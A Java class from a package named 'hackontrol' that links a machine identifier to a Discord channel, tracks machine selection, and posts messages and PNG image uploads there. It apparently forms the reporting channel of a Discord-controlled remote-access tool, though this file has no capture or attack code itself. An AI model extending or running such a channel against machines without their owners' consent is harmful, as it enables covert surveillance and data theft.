package com.khopan.hackontrol.source;

import java.awt.Graphics2D;
import java.awt.Image;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.util.function.Consumer;
import java.util.function.Supplier;

import javax.imageio.ImageIO;

import net.dv8tion.jda.api.entities.channel.middleman.MessageChannel;
import net.dv8tion.jda.api.utils.FileUpload;

public class DefaultCommandSource implements CommandSource {
	private final String machineIdentifier;
	private final MessageChannel channel;
	private final Supplier<Boolean> selected;
	private final Consumer<Boolean> setSelected;

	public DefaultCommandSource(String machineIdentifier, MessageChannel channel, Supplier<Boolean> selected, Consumer<Boolean> setSelected) {
		this.machineIdentifier = machineIdentifier;
		this.channel = channel;
		this.selected = selected;
		this.setSelected = setSelected;
	}

	@Override
	public String getMachineId() {
		return this.machineIdentifier;
	}

	@Override
	public boolean isSelected() {
		return this.selected.get();
	}

	@Override
	public void setSelected(boolean selected) {
		if(this.selected.get() == selected) {
			return;
		}

		this.setSelected.accept(selected);
		this.sendMessage('`' + this.machineIdentifier + "` was " + (selected ? "" : "un") + "selected!");
	}

	@Override
	public void sendMessage(String message) {
		this.channel.sendMessage(message).queue();
	}

	@Override
	public void sendCodeMessage(String message) {
		this.sendMessage('`' + message + '`');
	}

	@Override
	public void sendBoldCodeMessage(String message) {
		this.sendMessage("**`" + message + "`**");
	}

	@Override
	public void sendImage(Image image) {
		FileUpload upload = this.toFileUpload(image);

		if(upload == null) {
			return;
		}

		this.channel.sendFiles(upload).queue();
	}

	@Override
	public void sendImage(Image image, String message) {
		FileUpload upload = this.toFileUpload(image);

		if(upload == null) {
			return;
		}

		this.channel.sendMessage(message).addFiles(upload).queue();
	}

	private FileUpload toFileUpload(Image image) {
		BufferedImage bufferedImage;

		if(image instanceof BufferedImage buffered) {
			bufferedImage = buffered;
		} else {
			int width = image.getWidth(null);
			int height = image.getHeight(null);
			bufferedImage = new BufferedImage(width, height, BufferedImage.TYPE_INT_ARGB);
			Graphics2D Graphics = bufferedImage.createGraphics();
			Graphics.drawImage(image, 0, 0, null);
			Graphics.dispose();
		}

		ByteArrayOutputStream stream = new ByteArrayOutputStream();

		try {
			ImageIO.write(bufferedImage, "png", stream);
		} catch(Throwable ignored) {
			this.sendMessage("Failed to send an image `" + this.getMachineId() + '`');
			return null;
		}

		return FileUpload.fromData(stream.toByteArray(), "image.png");
	}
}
